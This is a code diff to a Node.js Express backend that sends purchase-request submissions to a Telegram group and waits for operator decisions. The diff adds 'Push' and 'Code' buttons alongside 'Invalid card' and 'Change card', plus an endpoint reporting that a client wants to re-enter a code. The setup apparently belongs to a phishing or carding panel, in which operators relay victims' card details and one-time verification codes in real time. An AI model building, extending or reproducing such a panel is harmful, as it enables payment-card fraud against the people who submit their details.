@@ -1,5 +1,6 @@
 require("dotenv").config();
 
+
 const express = require("express");
 const cors = require("cors");
 const { v4: uuidv4 } = require("uuid");
@@ -20,7 +21,6 @@ const TIMEOUT_MS = 10 * 60 * 1000;
 const pending = new Map();
 
 const lastSeen = new Map();
-
 
 async function tgPost(method, body) {
   if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
@@ -53,7 +53,10 @@ function orderKeyboard(request_id) {
         { text: "🚫 Инвалид карта",    callback_data: `${request_id}:invalid`      },
       ],
       [
-        { text: "📲 Пуш код",          callback_data: `${request_id}:push_code`    },
+        { text: "📲 Пуш",              callback_data: `${request_id}:push`          },
+        { text: "💬 Код",              callback_data: `${request_id}:push_code`     },
+      ],
+      [
         { text: "🔄 Смена карты",      callback_data: `${request_id}:change_card`  },
       ],
       [
@@ -93,7 +96,7 @@ async function sendOrderToTelegram({
 }) {
   if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");
 
-  const lines = ["🎟 Новая заявка на покупку"];
+  const lines = ["🎟 Новая заявка на покупку", `🆔 ID: ${request_id}`];
   if (name)        lines.push(`👤 Имя: ${name}`);
   if (address)     lines.push(`📍 Адрес: ${address}`);
   if (phone)       lines.push(`📞 Телефон: ${phone}`);
@@ -208,6 +211,24 @@ app.post("/api/code", async (req, res) => {
   res.json({ ok: true, request_id, action: result.action });
 });
 
+app.post("/api/re_enter_code", async (req, res) => {
+  const { request_id } = req.body || {};
+  if (!request_id) {
+    return res.status(400).json({ ok: false, error: "request_id required" });
+  }
+
+  try {
+    await tgPost("sendMessage", {
+      chat_id: GROUP_CHAT_ID,
+      text: `🔄 Клиент запросил повторный ввод кода\n🆔 Заявка: ${request_id}`,
+    });
+  } catch (err) {
+    console.error("[re_enter_code] Telegram error:", err.message);
+  }
+
+  res.json({ ok: true });
+});
+
 app.post("/api/callback", (req, res) => {
   const { request_id, action } = req.body || {};
   console.log(`[callback] request_id=${request_id}  action=${action}`);
@@ -236,7 +257,6 @@ app.get("/api/online", (req, res) => {
 app.get("/health", (_req, res) =>
   res.json({ ok: true, pending: pending.size })
 );
-
 
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Backend listening on http://0.0.0.0:${PORT}`);
